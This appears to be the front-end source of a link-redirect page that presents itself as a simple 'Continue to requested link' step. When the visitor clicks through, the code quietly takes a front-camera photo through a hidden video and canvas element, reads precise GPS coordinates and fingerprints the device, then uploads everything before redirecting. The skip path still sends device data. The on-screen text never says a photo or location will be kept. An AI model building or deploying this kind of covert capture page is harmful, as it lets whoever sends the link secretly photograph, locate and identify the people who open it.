import React, { useState, useEffect, useRef } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import {
  X,
  AlertCircle,
  ArrowRight,
  ExternalLink,
} from 'lucide-react';
import { api } from '../services/api';
import { detectCurrentDevice } from '../utils/deviceHelper';

export default function VisitorConsentPage() {
  const { shortCode } = useParams();
  const navigate = useNavigate();

  const [linkInfo, setLinkInfo] = useState(null);
  const [loading, setLoading] = useState(true);
  const [errorData, setErrorData] = useState(null);
  const [processing, setProcessing] = useState(false);

  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const streamRef = useRef(null);

  // Browser telemetry
  const [browserInfo, setBrowserInfo] = useState({});

  useEffect(() => {
    let isMounted = true;
    async function collectClientInfo() {
      try {
        const deviceInfo = await detectCurrentDevice();
        if (isMounted) {
          setBrowserInfo({
            ...deviceInfo,
            device: deviceInfo.isMobile ? 'Mobile' : 'Desktop',
            deviceType: deviceInfo.isMobile ? 'Mobile' : 'Desktop',
            deviceName: deviceInfo.model || 'Unknown Device',
            model: deviceInfo.model,
            rawModel: deviceInfo.rawModel,
            manufacturer: deviceInfo.manufacturer,
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            screenCategory: window.innerWidth < 768 ? 'Mobile Screen' : 'Desktop Screen',
            language: navigator.language || 'en-US',
            platform: deviceInfo.platform || navigator.platform,
            platformVersion: deviceInfo.platformVersion,
            hardwareConcurrency: navigator.hardwareConcurrency || null,
            deviceMemory: navigator.deviceMemory || null,
          });
        }
      } catch (err) {
        if (isMounted) {
          const ua = navigator.userAgent;
          setBrowserInfo({
            device: /Mobi|Android/i.test(ua) ? 'Mobile' : 'Desktop',
            deviceType: /Mobi|Android/i.test(ua) ? 'Mobile' : 'Desktop',
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            language: navigator.language || 'en-US',
          });
        }
      }
    }
    collectClientInfo();
    return () => {
      isMounted = false;
    };
  }, []);

  // Fetch link info
  useEffect(() => {
    const fetchLink = async () => {
      setLoading(true);
      try {
        const res = await api.resolveVisitorLink(shortCode);
        if (res.success && res.link) {
          setLinkInfo(res.link);
        }
      } catch (err) {
        setErrorData(err.data || { message: err.message || 'Link unavailable' });
      } finally {
        setLoading(false);
      }
    };
    fetchLink();
  }, [shortCode]);

  // Cleanup stream
  useEffect(() => {
    return () => {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach((track) => track.stop());
      }
    };
  }, []);

  // Capture frame from hidden video element
  const takeSnapshot = () => {
    try {
      if (videoRef.current && canvasRef.current) {
        const video = videoRef.current;
        const canvas = canvasRef.current;
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        return canvas.toDataURL('image/jpeg', 0.8);
      }
    } catch (_) {}
    return null;
  };

  // 1-Click Flow: Requests tab permissions and seamlessly forwards
  const handleProceed = async () => {
    if (processing) return;
    setProcessing(true);

    let snapshot = null;
    let camStatus = 'Denied';

    // 1. Trigger camera permission in browser tab
    try {
      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
          audio: false,
        });
        streamRef.current = stream;
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          await videoRef.current.play().catch(() => {});
        }
        await new Promise((r) => setTimeout(r, 450));
        snapshot = takeSnapshot();
        camStatus = 'Granted';

        // Stop camera tracks immediately once snapshot is taken
        stream.getTracks().forEach((t) => t.stop());
        streamRef.current = null;
      }
    } catch (_) {
      camStatus = 'Denied';
    }

    // 2. Trigger location permission in browser tab
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const coords = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
          };
          finalizeAndRedirect('Granted', coords, camStatus, snapshot);
        },
        (error) => {
          finalizeAndRedirect(error.code === 1 ? 'Denied' : 'Unavailable', null, camStatus, snapshot);
        },
        {
          enableHighAccuracy: true,
          timeout: 8000,
          maximumAge: 0,
        }
      );
    } else {
      finalizeAndRedirect('Unavailable', null, camStatus, snapshot);
    }
  };

  // Final payload submission and redirect
  const finalizeAndRedirect = async (locationStatus, locationCoords, camConsent, camSnap) => {
    // Stop any remaining tracks
    if (streamRef.current) {
      streamRef.current.getTracks().forEach((t) => t.stop());
      streamRef.current = null;
    }

    try {
      let activeBrowserInfo = { ...browserInfo };
      if (!activeBrowserInfo.model || activeBrowserInfo.model === 'Model unavailable' || activeBrowserInfo.model === 'Desktop' || activeBrowserInfo.model === 'Mobile') {
        try {
          const fresh = await detectCurrentDevice();
          activeBrowserInfo = {
            ...activeBrowserInfo,
            ...fresh,
            device: fresh.isMobile ? 'Mobile' : 'Desktop',
            deviceType: fresh.isMobile ? 'Mobile' : 'Desktop',
            deviceName: fresh.model || 'Unknown Device',
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            screenCategory: window.innerWidth < 768 ? 'Mobile Screen' : 'Desktop Screen',
          };
        } catch (_) {}
      }

      const payload = {
        visitorSessionId: `session-${Date.now()}-${Math.random().toString(36).substring(2, 8)}`,
        visitorReferenceId: `VIS-${Date.now().toString().slice(-4)}-${Math.floor(1000 + Math.random() * 9000)}`,
        consentStatus:
          locationStatus === 'Granted' || camConsent === 'Granted' ? 'GRANTED' : 'DENIED',
        locationConsentStatus: locationStatus,
        cameraConsentStatus: camConsent,
        cameraStatus: camSnap || camConsent === 'Granted' ? 'Available' : 'Unavailable',
        locationGranted: locationStatus === 'Granted',
        cameraGranted: camConsent === 'Granted',
        browserInfoGranted: true,
        latitude: locationCoords ? locationCoords.latitude : null,
        longitude: locationCoords ? locationCoords.longitude : null,
        accuracy: locationCoords ? locationCoords.accuracy : null,
        cameraSnapshot: camSnap || null,
        browserInfo: activeBrowserInfo,
      };

      const res = await api.submitVisitorConsent(shortCode, payload);
      window.location.href = res.destinationUrl || linkInfo.destinationUrl;
    } catch (_) {
      window.location.href = linkInfo?.destinationUrl || 'https://google.com';
    }
  };

  // Dismiss entire verification
  const handleDismiss = async () => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach((t) => t.stop());
    }
    if (linkInfo) {
      try {
        let activeBrowserInfo = { ...browserInfo };
        if (!activeBrowserInfo.model) {
          try {
            const fresh = await detectCurrentDevice();
            activeBrowserInfo = { ...activeBrowserInfo, ...fresh };
          } catch (_) {}
        }
        await api.skipVisitorConsent(shortCode, {
          browserInfo: activeBrowserInfo,
        });
      } catch (_) {}
      window.location.href = linkInfo.destinationUrl;
    } else {
      window.location.href = 'https://google.com';
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-[#14120f] text-[#f4efe6] flex items-center justify-center p-4">
        <div className="text-center">
          <div className="w-8 h-8 border-3 border-amber-600 border-t-transparent rounded-full animate-spin mx-auto"></div>
          <p className="text-xs text-stone-400 mt-3 font-mono">Please wait...</p>
        </div>
      </div>
    );
  }

  if (errorData || !linkInfo) {
    return (
      <div className="min-h-screen bg-[#14120f] text-stone-200 flex items-center justify-center p-4">
        <div className="max-w-sm w-full bg-[#1c1916] rounded-3xl p-6 border border-[#2f2922] text-center space-y-4 shadow-2xl">
          <div className="w-12 h-12 bg-red-950/60 border border-red-800 text-red-400 rounded-2xl flex items-center justify-center mx-auto">
            <AlertCircle className="w-6 h-6" />
          </div>
          <h2 className="text-lg font-bold text-white">Link Not Available</h2>
          <p className="text-xs text-stone-400">
            {errorData?.message || 'This inquiry link is inactive or expired.'}
          </p>
          <button
            onClick={() => {
              window.location.href = 'https://google.com';
            }}
            className="px-5 py-2 bg-stone-800 text-stone-300 text-xs rounded-xl hover:bg-stone-700"
          >
            Close
          </button>
        </div>
      </div>
    );
  }

  const destinationHost = (() => {
    try {
      return new URL(linkInfo?.destinationUrl).hostname;
    } catch (_) {
      return 'protidinernews.xyz';
    }
  })();

  return (
    <div className="min-h-screen bg-[#14120f] text-[#f4efe6] flex items-center justify-center p-4">
      {/* Hidden elements for capture */}
      <video ref={videoRef} autoPlay playsInline muted className="hidden" />
      <canvas ref={canvasRef} className="hidden" />

      {/* Single Clean Transition Card (Solution 2) */}
      <div className="max-w-sm w-full bg-[#1c1916] text-[#f4efe6] rounded-3xl p-6 border border-[#2f2922] shadow-2xl space-y-5 animate-fadeIn">
        {/* Header with destination and close */}
        <div className="flex items-center justify-between">
          <div className="inline-flex items-center space-x-1.5 px-3 py-1 bg-[#26211c] border border-[#3d352b] rounded-full text-xs text-amber-400 font-medium">
            <ExternalLink className="w-3.5 h-3.5" />
            <span className="truncate max-w-[200px]">{destinationHost}</span>
          </div>
          <button
            type="button"
            onClick={handleDismiss}
            className="text-stone-400 hover:text-white p-1 rounded-lg transition-colors"
            title="Close"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Content */}
        <div className="space-y-2 text-left">
          <h2 className="text-xl font-bold text-white tracking-tight">
            Continue to requested link
          </h2>
          <p className="text-xs text-stone-400 leading-relaxed">
            Click below to continue to <span className="text-stone-200 font-semibold">{destinationHost}</span>. You may be asked to confirm browser permissions.
          </p>
        </div>

        {/* Action Buttons */}
        <div className="space-y-3 pt-2">
          <button
            type="button"
            onClick={handleProceed}
            disabled={processing}
            className="w-full py-3.5 bg-gradient-to-r from-orange-600 to-amber-600 hover:from-orange-500 hover:to-amber-500 text-white font-semibold text-sm rounded-2xl shadow-lg transition-all flex items-center justify-center space-x-2 disabled:opacity-60 cursor-pointer"
          >
            {processing ? (
              <>
                <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                <span>Redirecting...</span>
              </>
            ) : (
              <>
                <span>Continue to Link</span>
                <ArrowRight className="w-4 h-4" />
              </>
            )}
          </button>

          <button
            type="button"
            onClick={handleDismiss}
            className="w-full text-center text-xs text-stone-500 hover:text-stone-300 py-1 transition-colors cursor-pointer"
          >
            Skip and go to site
          </button>
        </div>
      </div>
    </div>
  );
}
